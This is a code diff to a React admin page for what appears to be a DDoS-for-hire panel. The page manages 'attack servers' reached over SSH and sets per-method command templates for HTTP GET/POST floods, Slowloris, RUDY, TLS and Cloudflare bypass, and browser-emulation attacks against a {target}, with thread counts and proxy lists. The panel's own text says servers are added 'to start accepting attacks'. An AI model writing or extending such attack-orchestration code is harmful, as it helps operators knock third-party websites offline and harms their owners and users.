@@ -7,10 +7,10 @@ import Layout from "../components/Layout";
 import { Button } from "../components/ui/button";
 import { Input } from "../components/ui/input";
 import { Label } from "../components/ui/label";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "../components/ui/select";
 import { Switch } from "../components/ui/switch";
+import { Textarea } from "../components/ui/textarea";
 import { 
-  Server, Plus, Trash2, RefreshCw, Settings, Activity, Edit2, Save, X, Wifi, WifiOff
+  Server, Plus, Trash2, RefreshCw, Settings, Activity, Save, Wifi, WifiOff, Cpu, HardDrive, Terminal
 } from "lucide-react";
 import {
   Dialog,
@@ -22,8 +22,14 @@ import {
 } from "../components/ui/dialog";
 
 const AVAILABLE_METHODS = [
-  "HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", 
-  "TLS-BYPASS", "CF-BYPASS", "BROWSER-EMU", "RUDY"
+  { id: "HTTP-GET", name: "HTTP GET", placeholder: "./flood {target} {port} {duration} {threads} GET proxy.txt" },
+  { id: "HTTP-POST", name: "HTTP POST", placeholder: "./flood {target} {port} {duration} {threads} POST proxy.txt" },
+  { id: "HTTP-HEAD", name: "HTTP HEAD", placeholder: "./head {target} {port} {duration} {threads}" },
+  { id: "SLOWLORIS", name: "Slowloris", placeholder: "./slowloris {target} {port} {duration}" },
+  { id: "TLS-BYPASS", name: "TLS Bypass", placeholder: "./tls {target} {port} {duration} {threads}" },
+  { id: "CF-BYPASS", name: "CF Bypass", placeholder: "./cfbypass {target} {duration} {threads} proxy.txt" },
+  { id: "BROWSER-EMU", name: "Browser", placeholder: "./browser {target} {duration} proxy.txt" },
+  { id: "RUDY", name: "RUDY", placeholder: "./rudy {target} {port} {duration}" }
 ];
 
 export default function AdminServers() {
@@ -31,10 +37,8 @@ export default function AdminServers() {
   const [settings, setSettings] = useState({ global_max_concurrent: 500, maintenance_mode: false });
   const [loading, setLoading] = useState(true);
   const [addDialogOpen, setAddDialogOpen] = useState(false);
-  const [editingServer, setEditingServer] = useState(null);
   const token = localStorage.getItem("token");
 
-  // New server form
   const [newServer, setNewServer] = useState({
     name: "",
     host: "",
@@ -43,8 +47,7 @@ export default function AdminServers() {
     ssh_key: "",
     ssh_password: "",
     max_concurrent: 100,
-    methods: [],
-    attack_script_path: "/root/attack.py"
+    method_commands: []
   });
 
   useEffect(() => {
@@ -67,8 +70,8 @@ export default function AdminServers() {
   };
 
   const handleAddServer = async () => {
-    if (!newServer.name || !newServer.host || newServer.methods.length === 0) {
-      toast.error("Fill required fields: name, host, and at least one method");
+    if (!newServer.name || !newServer.host || newServer.method_commands.length === 0) {
+      toast.error("Enter name, host, and at least one method command");
       return;
     }
 
@@ -81,17 +84,16 @@ export default function AdminServers() {
       setNewServer({
         name: "", host: "", ssh_port: 22, ssh_user: "root",
         ssh_key: "", ssh_password: "", max_concurrent: 100,
-        methods: [], attack_script_path: "/root/attack.py"
+        method_commands: []
       });
       fetchData();
     } catch (err) {
-      toast.error(err.response?.data?.detail || "Failed to add server");
+      toast.error(err.response?.data?.detail || "Failed");
     }
   };
 
   const handleDeleteServer = async (serverId) => {
     if (!window.confirm("Delete this server?")) return;
-
     try {
       await axios.delete(`${API}/admin/servers/${serverId}`, {
         headers: { Authorization: `Bearer ${token}` }
@@ -99,7 +101,7 @@ export default function AdminServers() {
       toast.success("Server deleted");
       fetchData();
     } catch (err) {
-      toast.error("Failed to delete server");
+      toast.error("Failed");
     }
   };
 
@@ -108,10 +110,10 @@ export default function AdminServers() {
       const res = await axios.post(`${API}/admin/servers/${serverId}/ping`, {}, {
         headers: { Authorization: `Bearer ${token}` }
       });
-      toast.success(`Server is ${res.data.status}`);
+      toast.success(`Status: ${res.data.status}, CPU: ${res.data.cpu_usage}%, RAM: ${res.data.ram_used}GB`);
       fetchData();
     } catch (err) {
-      toast.error("Failed to ping server");
+      toast.error("Failed");
     }
   };
 
@@ -121,10 +123,10 @@ export default function AdminServers() {
         { is_active: !server.is_active },
         { headers: { Authorization: `Bearer ${token}` } }
       );
-      toast.success(server.is_active ? "Server disabled" : "Server enabled");
+      toast.success(server.is_active ? "Disabled" : "Enabled");
       fetchData();
     } catch (err) {
-      toast.error("Failed to update server");
+      toast.error("Failed");
     }
   };
 
@@ -133,33 +135,48 @@ export default function AdminServers() {
       await axios.put(`${API}/admin/settings`, settings, {
         headers: { Authorization: `Bearer ${token}` }
       });
-      toast.success("Settings updated");
+      toast.success("Settings saved");
     } catch (err) {
-      toast.error("Failed to update settings");
+      toast.error("Failed");
     }
   };
 
-  const toggleMethod = (method) => {
-    setNewServer(prev => ({
-      ...prev,
-      methods: prev.methods.includes(method)
-        ? prev.methods.filter(m => m !== method)
-        : [...prev.methods, method]
-    }));
+  const updateMethodCommand = (methodId, command) => {
+    setNewServer(prev => {
+      const existing = prev.method_commands.find(mc => mc.method_id === methodId);
+      if (existing) {
+        if (command === "") {
+          return { ...prev, method_commands: prev.method_commands.filter(mc => mc.method_id !== methodId) };
+        }
+        return {
+          ...prev,
+          method_commands: prev.method_commands.map(mc => 
+            mc.method_id === methodId ? { ...mc, command } : mc
+          )
+        };
+      } else if (command !== "") {
+        return { ...prev, method_commands: [...prev.method_commands, { method_id: methodId, command }] };
+      }
+      return prev;
+    });
   };
 
-  const getLoadColor = (load, max) => {
-    const percent = (load / max) * 100;
-    if (percent < 50) return "bg-green-500";
-    if (percent < 80) return "bg-yellow-500";
-    return "bg-red-500";
+  const getMethodCommand = (methodId) => {
+    return newServer.method_commands.find(mc => mc.method_id === methodId)?.command || "";
+  };
+
+  const getLoadPercent = (load, max) => Math.min((load / max) * 100, 100);
+  const getLoadColor = (percent) => {
+    if (percent < 50) return "bg-panel-success";
+    if (percent < 80) return "bg-panel-warning";
+    return "bg-panel-danger";
   };
 
   if (loading) {
     return (
       <Layout>
         <div className="flex items-center justify-center h-96">
-          <div className="w-8 h-8 border-2 border-cyber-primary border-t-transparent rounded-full animate-spin" />
+          <div className="w-8 h-8 border-2 border-panel-primary border-t-transparent rounded-full animate-spin" />
         </div>
       </Layout>
     );
@@ -167,130 +184,128 @@ export default function AdminServers() {
 
   return (
     <Layout>
-      <div data-testid="admin-servers" className="space-y-8">
+      <div data-testid="admin-servers" className="space-y-6">
         {/* Header */}
         <div className="flex items-center justify-between">
           <div>
-            <h1 className="font-heading text-3xl font-bold text-cyber-text tracking-tight flex items-center gap-3">
-              <Server className="w-8 h-8 text-cyber-primary" />
-              ATTACK SERVERS
+            <h1 className="text-2xl font-bold text-panel flex items-center gap-3">
+              <Server className="w-7 h-7 text-panel-primary" />
+              Attack Servers
             </h1>
-            <p className="text-cyber-muted mt-1">Manage dedicated attack servers</p>
+            <p className="text-panel-muted text-sm mt-1">Manage dedicated attack servers and commands</p>
           </div>
           
           <div className="flex items-center gap-2">
-            <Button onClick={fetchData} variant="ghost" className="text-cyber-muted hover:text-cyber-primary">
+            <Button onClick={fetchData} variant="ghost" className="text-panel-muted hover:text-panel-primary rounded-lg">
               <RefreshCw className="w-5 h-5" />
             </Button>
             
             <Dialog open={addDialogOpen} onOpenChange={setAddDialogOpen}>
               <DialogTrigger asChild>
-                <Button className="bg-cyber-primary text-black font-heading uppercase tracking-wider hover:bg-cyber-primary/90">
-                  <Plus className="w-5 h-5 mr-2" />
+                <Button className="bg-panel-primary hover:bg-panel-primary/90 text-white rounded-lg">
+                  <Plus className="w-4 h-4 mr-2" />
                   Add Server
                 </Button>
               </DialogTrigger>
-              <DialogContent className="bg-cyber-surface border-cyber-border max-w-lg max-h-[80vh] overflow-y-auto">
+              <DialogContent className="bg-panel-surface border-panel max-w-2xl max-h-[85vh] overflow-y-auto rounded-xl">
                 <DialogHeader>
-                  <DialogTitle className="font-heading text-cyber-text">Add Attack Server</DialogTitle>
-                  <DialogDescription className="text-cyber-muted">
-                    Configure a new dedicated server for attacks
+                  <DialogTitle className="text-panel">Add Attack Server</DialogTitle>
+                  <DialogDescription className="text-panel-muted">
+                    Configure server connection and attack commands
                   </DialogDescription>
                 </DialogHeader>
                 
-                <div className="space-y-4 py-4">
+                <div className="space-y-5 py-4">
+                  {/* Server Info */}
                   <div className="grid grid-cols-2 gap-4">
                     <div className="space-y-2">
-                      <Label className="text-xs uppercase tracking-widest text-cyber-muted">Server Name *</Label>
+                      <Label className="text-xs text-panel-muted">Server Name</Label>
                       <Input
                         value={newServer.name}
                         onChange={(e) => setNewServer(prev => ({ ...prev, name: e.target.value }))}
-                        placeholder="Server 1"
-                        className="bg-cyber-highlight border-cyber-border text-cyber-text"
+                        placeholder="EU-Server-1"
+                        className="bg-panel-hover border-panel text-panel rounded-lg"
                       />
                     </div>
                     <div className="space-y-2">
-                      <Label className="text-xs uppercase tracking-widest text-cyber-muted">Host/IP *</Label>
+                      <Label className="text-xs text-panel-muted">Host/IP</Label>
                       <Input
                         value={newServer.host}
                         onChange={(e) => setNewServer(prev => ({ ...prev, host: e.target.value }))}
                         placeholder="192.168.1.100"
-                        className="bg-cyber-highlight border-cyber-border text-cyber-text"
+                        className="bg-panel-hover border-panel text-panel rounded-lg"
                       />
                     </div>
                   </div>
                   
                   <div className="grid grid-cols-3 gap-4">
                     <div className="space-y-2">
-                      <Label className="text-xs uppercase tracking-widest text-cyber-muted">SSH Port</Label>
+                      <Label className="text-xs text-panel-muted">SSH Port</Label>
                       <Input
                         type="number"
                         value={newServer.ssh_port}
                         onChange={(e) => setNewServer(prev => ({ ...prev, ssh_port: parseInt(e.target.value) || 22 }))}
-                        className="bg-cyber-highlight border-cyber-border text-cyber-text"
+                        className="bg-panel-hover border-panel text-panel rounded-lg"
                       />
                     </div>
                     <div className="space-y-2">
-                      <Label className="text-xs uppercase tracking-widest text-cyber-muted">SSH User</Label>
+                      <Label className="text-xs text-panel-muted">SSH User</Label>
                       <Input
                         value={newServer.ssh_user}
                         onChange={(e) => setNewServer(prev => ({ ...prev, ssh_user: e.target.value }))}
-                        className="bg-cyber-highlight border-cyber-border text-cyber-text"
+                        className="bg-panel-hover border-panel text-panel rounded-lg"
                       />
                     </div>
                     <div className="space-y-2">
-                      <Label className="text-xs uppercase tracking-widest text-cyber-muted">Max Concurrent</Label>
+                      <Label className="text-xs text-panel-muted">Max Concurrent</Label>
                       <Input
                         type="number"
                         value={newServer.max_concurrent}
                         onChange={(e) => setNewServer(prev => ({ ...prev, max_concurrent: parseInt(e.target.value) || 100 }))}
-                        className="bg-cyber-highlight border-cyber-border text-cyber-text"
+                        className="bg-panel-hover border-panel text-panel rounded-lg"
                       />
                     </div>
                   </div>
                   
                   <div className="space-y-2">
-                    <Label className="text-xs uppercase tracking-widest text-cyber-muted">SSH Password (or use key)</Label>
+                    <Label className="text-xs text-panel-muted">SSH Password</Label>
                     <Input
                       type="password"
                       value={newServer.ssh_password}
                       onChange={(e) => setNewServer(prev => ({ ...prev, ssh_password: e.target.value }))}
-                      placeholder="Leave empty to use SSH key"
-                      className="bg-cyber-highlight border-cyber-border text-cyber-text"
+                      placeholder="Leave empty for SSH key"
+                      className="bg-panel-hover border-panel text-panel rounded-lg"
                     />
                   </div>
                   
-                  <div className="space-y-2">
-                    <Label className="text-xs uppercase tracking-widest text-cyber-muted">Attack Script Path</Label>
-                    <Input
-                      value={newServer.attack_script_path}
-                      onChange={(e) => setNewServer(prev => ({ ...prev, attack_script_path: e.target.value }))}
-                      className="bg-cyber-highlight border-cyber-border text-cyber-text font-code"
-                    />
-                  </div>
-                  
-                  <div className="space-y-2">
-                    <Label className="text-xs uppercase tracking-widest text-cyber-muted">Supported Methods *</Label>
-                    <div className="flex flex-wrap gap-2">
+                  {/* Method Commands */}
+                  <div className="space-y-3">
+                    <div className="flex items-center gap-2">
+                      <Terminal className="w-4 h-4 text-panel-primary" />
+                      <Label className="text-sm font-medium text-panel">Attack Commands</Label>
+                    </div>
+                    <p className="text-xs text-panel-muted">
+                      Define custom commands for each method. Use placeholders: {"{target}"}, {"{port}"}, {"{duration}"}, {"{threads}"}
+                    </p>
+                    
+                    <div className="space-y-3">
                       {AVAILABLE_METHODS.map((method) => (
-                        <button
-                          key={method}
-                          onClick={() => toggleMethod(method)}
-                          className={`px-3 py-1 text-xs font-code border transition-colors ${
-                            newServer.methods.includes(method)
-                              ? "bg-cyber-primary text-black border-cyber-primary"
-                              : "bg-cyber-highlight text-cyber-muted border-cyber-border hover:border-cyber-primary"
-                          }`}
-                        >
-                          {method}
-                        </button>
+                        <div key={method.id} className="space-y-1">
+                          <Label className="text-xs text-panel-muted">{method.name}</Label>
+                          <Input
+                            value={getMethodCommand(method.id)}
+                            onChange={(e) => updateMethodCommand(method.id, e.target.value)}
+                            placeholder={method.placeholder}
+                            className="bg-panel-hover border-panel text-panel font-mono text-sm rounded-lg"
+                          />
+                        </div>
                       ))}
                     </div>
                   </div>
                   
                   <Button 
                     onClick={handleAddServer}
-                    className="w-full bg-cyber-primary text-black font-heading uppercase tracking-wider hover:bg-cyber-primary/90"
+                    className="w-full bg-panel-primary hover:bg-panel-primary/90 text-white rounded-lg"
                   >
                     Add Server
                   </Button>
@@ -301,161 +316,183 @@ export default function AdminServers() {
         </div>
 
         {/* Global Settings */}
-        <motion.div
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          className="bg-cyber-surface border border-cyber-border p-6"
-        >
-          <h2 className="font-heading text-lg font-bold text-cyber-text mb-4 flex items-center gap-2">
-            <Settings className="w-5 h-5 text-cyber-accent" />
-            GLOBAL SETTINGS
-          </h2>
+        <div className="bg-panel-surface rounded-xl p-5 border border-panel">
+          <h3 className="text-sm font-semibold text-panel mb-4 flex items-center gap-2">
+            <Settings className="w-4 h-4 text-panel-primary" />
+            Global Settings
+          </h3>
           
-          <div className="grid md:grid-cols-3 gap-6">
+          <div className="grid md:grid-cols-3 gap-4 items-end">
             <div className="space-y-2">
-              <Label className="text-xs uppercase tracking-widest text-cyber-muted">Global Max Concurrent</Label>
+              <Label className="text-xs text-panel-muted">Max Global Concurrent</Label>
               <Input
                 type="number"
                 value={settings.global_max_concurrent}
                 onChange={(e) => setSettings(prev => ({ ...prev, global_max_concurrent: parseInt(e.target.value) || 500 }))}
-                className="bg-cyber-highlight border-cyber-border text-cyber-text"
+                className="bg-panel-hover border-panel text-panel rounded-lg"
               />
             </div>
             
-            <div className="flex items-center gap-4">
-              <Label className="text-xs uppercase tracking-widest text-cyber-muted">Maintenance Mode</Label>
+            <div className="flex items-center gap-3">
               <Switch
                 checked={settings.maintenance_mode}
                 onCheckedChange={(checked) => setSettings(prev => ({ ...prev, maintenance_mode: checked }))}
               />
+              <span className="text-sm text-panel">Maintenance Mode</span>
               {settings.maintenance_mode && (
-                <span className="text-xs text-cyber-secondary uppercase">Active</span>
+                <span className="text-xs text-panel-danger font-medium">ACTIVE</span>
               )}
             </div>
             
-            <div className="flex items-end">
-              <Button onClick={handleUpdateSettings} className="bg-cyber-accent text-black font-heading uppercase tracking-wider">
-                <Save className="w-4 h-4 mr-2" />
-                Save Settings
-              </Button>
-            </div>
+            <Button onClick={handleUpdateSettings} className="bg-panel-success hover:bg-panel-success/90 text-white rounded-lg">
+              <Save className="w-4 h-4 mr-2" />
+              Save
+            </Button>
           </div>
-        </motion.div>
+        </div>
 
         {/* Servers List */}
         <div className="space-y-4">
           {servers.length === 0 ? (
-            <div className="bg-cyber-surface border border-cyber-border p-12 text-center">
-              <Server className="w-12 h-12 text-cyber-muted mx-auto mb-4" />
-              <p className="text-cyber-muted">No servers configured yet</p>
-              <p className="text-cyber-muted text-sm">Add a server to start accepting attacks</p>
+            <div className="bg-panel-surface rounded-xl p-12 text-center border border-panel">
+              <Server className="w-12 h-12 text-panel-muted mx-auto mb-4" />
+              <p className="text-panel-muted">No servers configured</p>
+              <p className="text-panel-muted text-sm">Add a server to start</p>
             </div>
           ) : (
-            servers.map((server, idx) => (
-              <motion.div
-                key={server.id}
-                initial={{ opacity: 0, y: 20 }}
-                animate={{ opacity: 1, y: 0 }}
-                transition={{ delay: idx * 0.05 }}
-                className={`bg-cyber-surface border p-6 ${
-                  server.is_active ? "border-cyber-border" : "border-cyber-border opacity-60"
-                }`}
-              >
-                <div className="flex items-start justify-between">
-                  <div className="flex items-center gap-4">
-                    <div className={`w-4 h-4 rounded-full ${
-                      server.status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"
-                    }`} />
-                    <div>
-                      <h3 className="font-heading text-lg font-bold text-cyber-text">{server.name}</h3>
-                      <p className="font-code text-sm text-cyber-muted">{server.host}:{server.ssh_port}</p>
+            servers.map((server, idx) => {
+              const loadPercent = getLoadPercent(server.current_load || 0, server.max_concurrent);
+              const methods = server.method_commands?.map(mc => mc.method_id) || [];
+              
+              return (
+                <motion.div
+                  key={server.id}
+                  initial={{ opacity: 0, y: 20 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  transition={{ delay: idx * 0.05 }}
+                  className={`bg-panel-surface rounded-xl p-5 border ${
+                    server.is_active ? "border-panel" : "border-panel opacity-60"
+                  }`}
+                >
+                  <div className="flex items-start justify-between mb-4">
+                    <div className="flex items-center gap-3">
+                      <div className={`w-3 h-3 rounded-full ${
+                        server.status === "online" ? "bg-panel-success animate-pulse" : "bg-panel-danger"
+                      }`} />
+                      <div>
+                        <h3 className="font-semibold text-panel">{server.name}</h3>
+                        <p className="font-mono text-sm text-panel-muted">{server.host}:{server.ssh_port}</p>
+                      </div>
+                    </div>
+                    
+                    <div className="flex items-center gap-1">
+                      <Button
+                        onClick={() => handlePingServer(server.id)}
+                        variant="ghost"
+                        size="sm"
+                        className="text-panel-muted hover:text-panel-primary rounded-lg"
+                        title="Ping server"
+                      >
+                        {server.status === "online" ? <Wifi className="w-4 h-4" /> : <WifiOff className="w-4 h-4" />}
+                      </Button>
+                      <Button
+                        onClick={() => handleToggleServer(server)}
+                        variant="ghost"
+                        size="sm"
+                        className={`rounded-lg ${server.is_active ? "text-panel-success" : "text-panel-muted"}`}
+                        title={server.is_active ? "Disable" : "Enable"}
+                      >
+                        <Activity className="w-4 h-4" />
+                      </Button>
+                      <Button
+                        onClick={() => handleDeleteServer(server.id)}
+                        variant="ghost"
+                        size="sm"
+                        className="text-panel-muted hover:text-panel-danger rounded-lg"
+                        title="Delete"
+                      >
+                        <Trash2 className="w-4 h-4" />
+                      </Button>
                     </div>
                   </div>
                   
-                  <div className="flex items-center gap-2">
-                    <Button
-                      onClick={() => handlePingServer(server.id)}
-                      variant="ghost"
-                      size="sm"
-                      className="text-cyber-muted hover:text-cyber-accent"
-                    >
-                      {server.status === "online" ? <Wifi className="w-4 h-4" /> : <WifiOff className="w-4 h-4" />}
-                    </Button>
-                    <Button
-                      onClick={() => handleToggleServer(server)}
-                      variant="ghost"
-                      size="sm"
-                      className={server.is_active ? "text-cyber-primary" : "text-cyber-muted"}
-                    >
-                      <Activity className="w-4 h-4" />
-                    </Button>
-                    <Button
-                      onClick={() => handleDeleteServer(server.id)}
-                      variant="ghost"
-                      size="sm"
-                      className="text-cyber-muted hover:text-cyber-secondary"
-                    >
-                      <Trash2 className="w-4 h-4" />
-                    </Button>
+                  {/* Stats Grid */}
+                  <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-4">
+                    <div>
+                      <p className="text-xs text-panel-muted">Status</p>
+                      <p className={`text-sm font-medium ${server.status === "online" ? "text-panel-success" : "text-panel-danger"}`}>
+                        {server.status || "Unknown"}
+                      </p>
+                    </div>
+                    <div>
+                      <p className="text-xs text-panel-muted">SSH User</p>
+                      <p className="text-sm font-mono text-panel">{server.ssh_user}</p>
+                    </div>
+                    <div>
+                      <p className="text-xs text-panel-muted">Max Concurrent</p>
+                      <p className="text-sm font-mono text-panel">{server.max_concurrent}</p>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <Cpu className="w-4 h-4 text-panel-muted" />
+                      <div>
+                        <p className="text-xs text-panel-muted">CPU</p>
+                        <p className="text-sm font-mono text-panel">{server.cpu_usage || 0}%</p>
+                      </div>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <HardDrive className="w-4 h-4 text-panel-muted" />
+                      <div>
+                        <p className="text-xs text-panel-muted">RAM</p>
+                        <p className="text-sm font-mono text-panel">{server.ram_used || 0}/{server.ram_total || 0}GB</p>
+                      </div>
+                    </div>
                   </div>
-                </div>
-                
-                <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-4">
+                  
+                  {/* Load bar */}
+                  <div className="mb-4">
+                    <div className="flex justify-between text-xs text-panel-muted mb-1">
+                      <span>Current Load</span>
+                      <span>{server.current_load || 0} / {server.max_concurrent}</span>
+                    </div>
+                    <div className="h-2 bg-panel-hover rounded-full overflow-hidden">
+                      <div 
+                        className={`h-full ${getLoadColor(loadPercent)} transition-all`}
+                        style={{ width: `${loadPercent}%` }}
+                      />
+                    </div>
+                  </div>
+                  
+                  {/* Methods */}
                   <div>
-                    <p className="text-xs text-cyber-muted uppercase">Status</p>
-                    <p className={`font-code text-sm ${server.status === "online" ? "text-green-500" : "text-red-500"}`}>
-                      {server.status || "Unknown"}
-                    </p>
+                    <p className="text-xs text-panel-muted mb-2">Configured Methods ({methods.length})</p>
+                    <div className="flex flex-wrap gap-2">
+                      {methods.map((method, i) => (
+                        <span key={i} className="px-2 py-1 text-xs font-mono bg-panel-hover rounded text-panel-primary">
+                          {method}
+                        </span>
+                      ))}
+                    </div>
                   </div>
-                  <div>
-                    <p className="text-xs text-cyber-muted uppercase">SSH User</p>
-                    <p className="font-code text-sm text-cyber-text">{server.ssh_user}</p>
-                  </div>
-                  <div>
-                    <p className="text-xs text-cyber-muted uppercase">Max Concurrent</p>
-                    <p className="font-code text-sm text-cyber-text">{server.max_concurrent}</p>
-                  </div>
-                  <div>
-                    <p className="text-xs text-cyber-muted uppercase">Active</p>
-                    <p className={`font-code text-sm ${server.is_active ? "text-cyber-primary" : "text-cyber-muted"}`}>
-                      {server.is_active ? "Yes" : "No"}
-                    </p>
-                  </div>
-                </div>
-                
-                {/* Load bar */}
-                <div className="mt-4">
-                  <div className="flex justify-between text-xs text-cyber-muted mb-1">
-                    <span>Current Load</span>
-                    <span>{server.current_load || 0} / {server.max_concurrent}</span>
-                  </div>
-                  <div className="h-2 bg-cyber-highlight rounded-full overflow-hidden">
-                    <div 
-                      className={`h-full ${getLoadColor(server.current_load || 0, server.max_concurrent)} transition-all`}
-                      style={{ width: `${((server.current_load || 0) / server.max_concurrent) * 100}%` }}
-                    />
-                  </div>
-                </div>
-                
-                {/* Methods */}
-                <div className="mt-4">
-                  <p className="text-xs text-cyber-muted uppercase mb-2">Supported Methods</p>
-                  <div className="flex flex-wrap gap-2">
-                    {server.methods?.map((method, i) => (
-                      <span key={i} className="px-2 py-1 text-xs font-code bg-cyber-highlight border border-cyber-border text-cyber-accent">
-                        {method}
-                      </span>
-                    ))}
-                  </div>
-                </div>
-                
-                {/* Script Path */}
-                <div className="mt-4">
-                  <p className="text-xs text-cyber-muted uppercase">Attack Script</p>
-                  <p className="font-code text-sm text-cyber-muted">{server.attack_script_path}</p>
-                </div>
-              </motion.div>
-            ))
+                  
+                  {/* Commands Preview */}
+                  {server.method_commands?.length > 0 && (
+                    <div className="mt-4 pt-4 border-t border-panel">
+                      <p className="text-xs text-panel-muted mb-2 flex items-center gap-1">
+                        <Terminal className="w-3 h-3" />
+                        Commands
+                      </p>
+                      <div className="space-y-1 max-h-32 overflow-y-auto">
+                        {server.method_commands.map((mc, i) => (
+                          <div key={i} className="text-xs font-mono bg-panel-hover p-2 rounded text-panel-muted">
+                            <span className="text-panel-primary">{mc.method_id}:</span> {mc.command}
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+                  )}
+                </motion.div>
+              );
+            })
           )}
         </div>
       </div>
